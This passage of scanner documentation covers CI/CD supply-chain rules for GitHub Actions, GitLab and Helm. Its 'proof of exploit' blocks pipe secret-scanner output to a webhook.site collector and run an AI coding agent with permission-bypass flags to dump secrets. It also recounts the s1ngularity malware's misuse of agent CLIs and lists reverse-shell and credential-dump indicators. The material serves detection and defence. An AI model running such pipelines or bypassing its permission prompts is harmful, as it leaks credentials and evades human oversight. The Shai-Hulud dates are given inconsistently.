1. ``trufflehog`` / ``gitleaks`` invocation in a ``run:`` block whose stdout pipes to ``curl`` / ``wget`` / ``nc`` / ``gh api -X POST`` — this is the harvest leg of the Shai-Hulud worm postinstall and any similar credential-stealer primitive.
2. ``trufflehog`` / ``gitleaks`` invoked unconditionally on a workflow whose triggers include ``pull_request_target``, ``issue_comment``, or ``workflow_run`` — the scanner is running with privileged secrets on an attacker-influenced trigger, so even if the output isn't piped to egress today, the next person editing the workflow can land that change via a PR comment.
3. ``curl`` / ``wget`` / ``httpie`` POST/PUT/PATCH (or ``--data`` upload) to a non-GitHub host whose payload references ``${{ secrets.* }}``, a credential-named env var (``$GITHUB_TOKEN``, ``$NPM_TOKEN``, ``$AWS_*`` keys, etc.), or dumps the runner env (``$(env)``, ``$(printenv)``, ``env > ...``). Catches the third-party-webhook exfil shape where the scanner doesn't run at all — the workflow simply POSTs a build-telemetry payload to an external service that, if the domain lapses or the service is breached, leaks every downstream build's env (which includes ``GITHUB_TOKEN`` always, plus any mapped ``${{ secrets.* }}``). GitHub-owned hosts are allow-listed (``github.com``, ``api.github.com``, ``*.githubusercontent.com``, ``codecov.io`` for the canonical upload path).

Legitimate uses pass: scanner output written to ``${{ github.workspace }}`` or a file under the repo, output uploaded via ``github/codeql-action/upload-sarif`` (CodeQL API, not raw HTTP), and any invocation gated by a ``push``-to-default-branch ``if:`` predicate.

**Recommendation.** Stop piping secret-scanner output to a network egress tool. Legitimate scans write their findings to the workspace, the Code Scanning API (SARIF upload), or the workflow log — none of which involve ``curl`` / ``wget`` / ``nc`` / ``gh api POST``. If the scanner is run on a fork-PR-style trigger (``pull_request_target`` / ``issue_comment`` / ``workflow_run``), move it to a vanilla ``pull_request`` trigger so an attacker can't supply the scanner's configuration or scan path. Pin the scanner action to a commit SHA, not a tag, and gate the upload step behind a protected environment.

**Known false positives.**

- Security teams that run secret scanners and POST results to their own internal SOAR / ticketing system trip the egress leg of this rule. Suppress on the specific step with a rationale that names the destination host; the rule's default posture is that any scanner-to-network pipe is credential-exfil-shaped.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the postinstall payload ran TruffleHog against the filesystem and cloud metadata endpoints, then POSTed the discovered secrets to ``webhook.site/<uuid>`` and a public GitHub repo created by the worm. The TruffleHog leg is what made the secrets worth stealing; without it the worm would have nothing to exfiltrate.

**Proof of exploit.**

```
# Vulnerable: the scanner harvests secrets, the pipe sends
# them to a public collector. The Shai-Hulud postinstall
# ran an in-line equivalent of this exact pipeline.
jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          trufflehog filesystem . --json \
            | curl -X POST --data-binary @- \
                https://webhook.site/<uuid>

# Safe: the scanner runs, output is uploaded via the
# official Code Scanning API. No raw network egress.
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions: { security-events: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: trufflehog filesystem . --json > findings.sarif
      - uses: github/codeql-action/upload-sarif@<sha>
        with: { sarif_file: findings.sarif }
```

**Source:** [`GHA-057`](../providers/github.md#gha-057) in the [GitHub Actions provider](../providers/github.md).

### `GHA-058`: Agentic CLI invoked with permission-bypass flags <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-058 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires on a ``run:`` body invoking any of the following CLIs with the matching permission-bypass flag:

* ``claude … --dangerously-skip-permissions``
* ``gemini … --yolo``
* ``q chat … --trust-all-tools``
* ``cursor-agent …`` (any unprotected invocation; the CLI's default mode is the unsafe one)
* any of the above with ``--allowedTools '*'`` / ``--allowedTools '.*'`` / ``--allowedTools all``
* ``aider`` / ``openhands`` / ``goose`` with equivalent ``--auto`` / ``--no-confirm`` / ``--full-auto`` flags.

Does NOT fire on a clearly-scoped invocation, e.g. ``claude --allowedTools 'Read,Grep'`` with a literal allow-list, or ``q chat --trust-tools 'fs_read'``.

**Recommendation.** Don't run an agentic CLI (claude / gemini / q / cursor-agent / aider / openhands / goose) with its safety flags disabled inside CI. The flags ``--dangerously-skip-permissions``, ``--yolo``, ``--trust-all-tools``, ``--allowedTools "*"`` let the agent shell out, read arbitrary files, and post to arbitrary HTTP endpoints with no per-action prompt — under the runner's identity. In CI that means it can read every ``${{ secrets.* }}`` value the workflow has access to and POST them anywhere. Either drop the bypass flag (and accept the manual confirmation prompts CI can't satisfy, so don't run it in CI at all), or gate the step behind a protected ``environment:`` and pre-vet the prompt that's being fed to the agent.

**Known false positives.**

- Internal tooling that legitimately runs an agentic CLI in CI (e.g. a doc-generation job) might pass a bypass flag for convenience. The right fix is to scope the allow-list rather than suppress the rule. If suppression is truly the only path, do it on the specific step with a rationale that names which tools the agent is allowed to invoke.

**Seen in the wild.**

- Nx s1ngularity compromise (Aug 2025): the malicious postinstall payload looked for ``claude``, ``gemini``, and ``q`` on PATH and invoked them with ``--dangerously-skip-permissions`` / ``--yolo`` / ``--trust-all-tools`` plus a prompt that walked the filesystem and emitted any secret-shaped values. The same primitive in a CI workflow turns the runner's secrets into an open buffet for whoever can land a PR. https://nx.dev/blog/s1ngularity-postmortem

**Proof of exploit.**

```
# Vulnerable: the bypass flag turns the agent into an
# unattended shell that can read ``${{ secrets.* }}`` and
# POST anywhere on the internet. This is the s1ngularity
# postinstall pattern lifted into a workflow.
jobs:
  agentic:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          npm i -g @anthropic-ai/claude-code
          claude --dangerously-skip-permissions \
            -p 'walk the filesystem and dump anything secret-shaped'

# Safe: the agent runs with a literal tool allow-list, no
# blanket bypass. The job is also environment-gated so the
# prompt itself is reviewed before execution.
jobs:
  agentic:
    runs-on: ubuntu-latest
    environment: agentic-review
    steps:
      - uses: actions/checkout@<sha>
      - run: claude --allowedTools 'Read,Grep' -p "$PROMPT"
```

**Source:** [`GHA-058`](../providers/github.md#gha-058) in the [GitHub Actions provider](../providers/github.md).

### `GHA-059`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-059 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per workflow when:

1. The workflow runs at least one npm / pnpm install command (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No step anywhere in the workflow runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only workflows pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's equivalent ``yarn npm audit`` does not yet verify registry trusted-publisher signatures; Bun has no equivalent step). The rule pairs with NPM-002 (lockfile entry missing integrity hash) and NPM-006 (known-compromised package version): NPM-002 / NPM-006 verify *what* the lockfile pinned, and GHA-059 verifies the lockfile pinned what the maintainer actually signed.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install step. Lockfile pinning guarantees installed bytes match what the lockfile recorded; ``audit signatures`` verifies those bytes were signed by the registry-trusted publisher for the package. Without it, a compromised maintainer account can publish a malicious version that the next lockfile refresh will pin and install without complaint, because integrity-only checks have no view into who actually signed the bytes. Place the step after ``npm ci`` / ``pnpm install`` and before any code from ``node_modules/`` runs (``npm run build``, test, publish).

**Known false positives.**

- Workflows that build and test against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore integration) cannot run ``npm audit signatures`` meaningfully — the registry has no signatures to verify against. Suppress this rule on the specific workflow with a rationale that names the private registry; revisit when the registry adds trusted-publisher support.
- Workflows whose only install command is ``npm install --no-save`` for a one-off tool (linter, doc generator) without a lockfile in the repo. Suppress if signature verification adds no signal because nothing is pinned in the first place; the right fix is usually to add the lockfile, not suppress the rule.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises: each abused the gap between lockfile-pinned integrity and registry-signed-publisher provenance. The lockfile faithfully pinned what the maintainer's account published; ``npm audit signatures`` would have flagged that the bytes weren't signed by the trusted-publisher record on file with the registry.

**Source:** [`GHA-059`](../providers/github.md#gha-059) in the [GitHub Actions provider](../providers/github.md).

### `GHA-060`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-060 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per workflow when:

1. The workflow runs a real ``pip install`` invocation (``pip install``, ``pip3 install``, ``python -m pip install``, ``python3 -m pip install``) that isn't a tooling-bootstrap exempted by the allowlist;
2. No invocation in the workflow passes ``--require-hashes`` AND no step uses a lockfile-consuming manager (``uv sync`` / ``uv pip sync``, ``poetry install``, ``pipenv install --deploy`` / ``pipenv sync``).

Tooling-bootstrap allowlist (silent-passes): ``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``, ``pip install --upgrade pip-tools``, ``pip install pipx``, ``pip install pip-audit / cyclonedx-bom / semgrep``. These are the same shapes GL-022 / BB-022 exempt for the dep-update rule.

Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the package-side: PYPI-002 verifies *what* the requirements file pinned, GHA-060 verifies the install command actually consumes those pins.

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``. The hash-pinned mode refuses to install any package whose downloaded tarball doesn't match a recorded SHA-256, which is the equivalent of npm's lockfile-integrity guarantee for PyPI. Generate the hashes with ``pip-compile --generate-hashes`` (from ``pip-tools``) or migrate to a package manager that hash-pins by default: ``uv sync`` (reads ``uv.lock``), ``poetry install`` (reads ``poetry.lock``), or ``pipenv install --deploy`` (reads ``Pipfile.lock``). The rule silent-passes when any of those managers runs in the same workflow.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records (legacy DevPI, self-hosted simple indexes without per-file hashes) cannot run ``--require-hashes`` meaningfully. Suppress on the specific workflow with a rationale that names the private index.
- One-off tool installs that aren't on the allowlist but are genuinely bootstrap-only (e.g. ``pip install some-niche-linter``). The right fix is usually to install via the lockfile-managed venv; if not feasible, suppress on the specific step.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins. ``--require-hashes`` would have refused the swapped artifact because the recorded SHA-256 wouldn't match the malicious tarball.

**Source:** [`GHA-060`](../providers/github.md#gha-060) in the [GitHub Actions provider](../providers/github.md).

### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Floating tags (`latest` or major-only) can be silently swapped under the job. Every `image:` reference should pin a specific version tag or digest.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag (e.g. `python:3.12.1-slim`). Avoid `:latest` and bare tags like `:3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation), [`ENF-2`](#ctrl-enf-2) L2: Break the build when a violation is detected.

**How this is detected.** A job whose stage or name contains `deploy` / `release` / `publish` / `promote` should either require manual approval or declare an `environment:` binding. Otherwise any push to the trigger branch ships to the target.

**Recommendation.** Add `when: manual` (optionally with `rules:` for protected branches) or bind the job to an `environment:` with a deployment tier so approvals and audit are enforced by GitLab's environment controls.

**Source:** [`GL-004`](../providers/gitlab.md#gl-004) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-005`: include: pulls remote / project without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.

**Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.

**Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Unsigned artifacts can't be verified downstream, so a tampered build is indistinguishable from a legitimate one. Pass when any of cosign / sigstore / slsa-* / notation-sign appears in the pipeline text.

**Recommendation.** Add a job that runs `cosign sign` (keyless OIDC with GitLab's id_tokens works out of the box) or `notation sign`. Publish the signature next to the artifact and verify it on consume.

**Source:** [`GL-006`](../providers/gitlab.md#gl-006) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / spdx-sbom-generator / sbom-tool / Trivy-SBOM appears in the pipeline body.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or GitLab's built-in CycloneDX dependency-scanning template. Attach the SBOM as a pipeline artifact.

**Source:** [`GL-007`](../providers/gitlab.md#gl-007) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-009`: Image pinned to version tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-gl-009 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** GL-001 fails floating tags at HIGH; GL-009 is the stricter tier. Even immutable-looking version tags (`python:3.12.1`) can be repointed by registry operators. Digest pins are the only tamper-evident form.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and replace the tag with `@sha256:<digest>`. Automate refreshes with Renovate.

**Source:** [`GL-009`](../providers/gitlab.md#gl-009) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-019`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-019 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GL-019`](../providers/gitlab.md#gl-019) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-021`](../providers/gitlab.md#gl-021) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GL-022`](../providers/gitlab.md#gl-022) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-023 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** ``cosign sign`` and ``cosign attest`` look similar but mean different things: the first binds identity to bytes; the second binds a structured claim (builder, source, inputs) to the artifact. SLSA Build L3 verifiers check the latter.

**Recommendation.** Add a job that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or adopt a SLSA-aware builder (the SLSA project ships GitLab templates). Signing the artifact (GL-006) isn't enough for SLSA L3, the attestation describes *how* the build ran.

**Source:** [`GL-024`](../providers/gitlab.md#gl-024) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-025 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires on concrete indicators (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, ``env | curl`` credential dumps, ``history -c`` audit erasure). Orthogonal to GL-003 (curl pipe) and GL-017 (Docker insecure flags). Those flag risky defaults; this flags evidence.

**Recommendation.** Treat as a potential compromise. Identify the MR that added the matching job(s), rotate any credentials the pipeline can reach, and audit recent runs for outbound traffic to the matched hosts. A legitimate red-team exercise should be time-bounded via ``.pipelinecheckignore`` with ``expires:``.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Complements GL-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs all bypass the registry integrity controls the lockfile relies on, an attacker who can move a branch head, drop a sibling checkout, or change a served tarball can substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GL-027`](../providers/gitlab.md#gl-027) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-028`: services: image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-028 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** ``services:`` entries (top-level or per-job) can be either a string (``redis:7``) or a dict (``{name: redis:7, alias: cache}``). Both forms are normalized via ``image_ref``-style extraction and evaluated with the same floating-tag regex GL-001 uses for ``image:``.

**Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.

**Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }

**Evidences:** [`ENF-2`](#ctrl-enf-2) L2: Break the build when a violation is detected.

**How this is detected.** This is the most common GitLab deployment gotcha: a manual ``deploy`` job looks like a gate in the UI, but the pipeline reports success on the first run because the job is marked allow_failure by default. Downstream jobs (and the overall pipeline status) proceed as though the human approved.

**Recommendation.** Add ``allow_failure: false`` to every deploy-like ``when: manual`` job. GitLab defaults ``allow_failure`` to *true* for manual jobs, which makes the pipeline report success whether or not the operator clicks, exactly the opposite of the gate you meant to add.

**Source:** [`GL-029`](../providers/gitlab.md#gl-029) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-030`: trigger: include: pulls child pipeline without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-030 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.

**Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.

**Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-034`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-034 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per pipeline file when:

1. Some job's ``before_script:`` / ``script:`` / ``after_script:`` runs an npm or pnpm install verb (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No job anywhere in the pipeline runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's ``yarn npm audit`` does not yet verify registry trusted-publisher records). Pairs with the per-package lockfile rules NPM-002 / NPM-006: NPM-002 / NPM-006 verify *what* the lockfile pinned, GL-034 verifies the lockfile pinned what the maintainer actually signed.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install. Lockfile pinning only guarantees the bytes installed match what the lockfile recorded; ``audit signatures`` is what verifies those bytes were signed by the maintainer the registry recognizes as the package's trusted publisher. Run it as a separate script line after ``npm ci`` and before any code from ``node_modules/`` executes.

**Known false positives.**

- Pipelines that build against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore) cannot run ``audit signatures`` meaningfully. Suppress on the specific pipeline with a rationale that names the private registry.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises rode the gap between lockfile-pinned integrity and registry-signed-publisher provenance. ``npm audit signatures`` is the gate that consumes trusted-publisher records.

**Source:** [`GL-034`](../providers/gitlab.md#gl-034) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-035`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-035 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per pipeline file when:

1. Some job's ``before_script:`` / ``script:`` / ``after_script:`` runs a real ``pip install`` (``pip install``, ``pip3 install``, ``python -m pip install``) that isn't a tooling-bootstrap exempted by the allowlist;
2. No job uses ``--require-hashes`` AND no job uses a lockfile-consuming manager (``uv sync`` / ``uv pip sync``, ``poetry install``, ``pipenv install --deploy`` / ``pipenv sync``).

Tooling-bootstrap allowlist (same as GHA-060).

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``, or migrate to a manager that hash-pins by default: ``uv sync``, ``poetry install``, ``pipenv install --deploy``. Hash-pinned install is the PyPI equivalent of npm's lockfile-integrity guarantee: it refuses to install any tarball whose SHA-256 doesn't match a recorded entry.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records (legacy DevPI, self-hosted simple indexes without per-file hashes) cannot run ``--require-hashes`` meaningfully. Suppress on the specific pipeline with a rationale that names the private index.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins; ``--require-hashes`` would have refused the swap.

**Source:** [`GL-035`](../providers/gitlab.md#gl-035) in the [GitLab CI provider](../providers/gitlab.md).

### `HELM-001`: Chart.yaml declares legacy apiVersion: v1 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-001 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** ``apiVersion`` lives at the top of ``Chart.yaml``. ``v1`` is Helm 2's format and uses a sibling ``requirements.yaml`` for dependencies; ``v2`` is Helm 3's format and inlines them in ``Chart.yaml`` alongside a ``Chart.lock`` for digest pinning. Without v2 there is no in-tree dependency manifest to lock, which is why HELM-002 only fires on v2 charts.

**Recommendation.** Bump ``Chart.yaml`` to ``apiVersion: v2`` and migrate any sibling ``requirements.yaml`` entries into the ``dependencies:`` list inside ``Chart.yaml``. Run ``helm dependency update`` to regenerate ``Chart.lock`` so HELM-002's per-dependency digest check has something to read. Helm 3 has been the default shipping channel since November 2019; the v1 format is kept for read-compat but blocks lockfile-based supply-chain controls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-001`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-002`: Chart.lock missing per-dependency digests <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-002 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions), [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Three failure shapes:

1. ``Chart.yaml`` declares dependencies but no ``Chart.lock`` exists at all.
2. ``Chart.lock`` exists but its ``dependencies:`` list is missing entries declared in ``Chart.yaml`` (drift after an edit without re-running ``helm dependency update``).
3. ``Chart.lock`` lists every dependency but one or more entries lack a ``digest:`` field (lock generated by an old Helm 3 version that didn't always populate it).

v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirements.lock`` against a sibling ``requirements.yaml``. Fix HELM-001 first.

**Recommendation.** After every change to ``dependencies:`` in ``Chart.yaml``, re-run ``helm dependency update`` and commit the regenerated ``Chart.lock``. The lock records the resolved version *and* a ``sha256:...`` digest that ``helm dependency build`` verifies on download, without it, a compromised chart repo can swap the tarball under the same version and ``helm install`` will happily use the substitute.

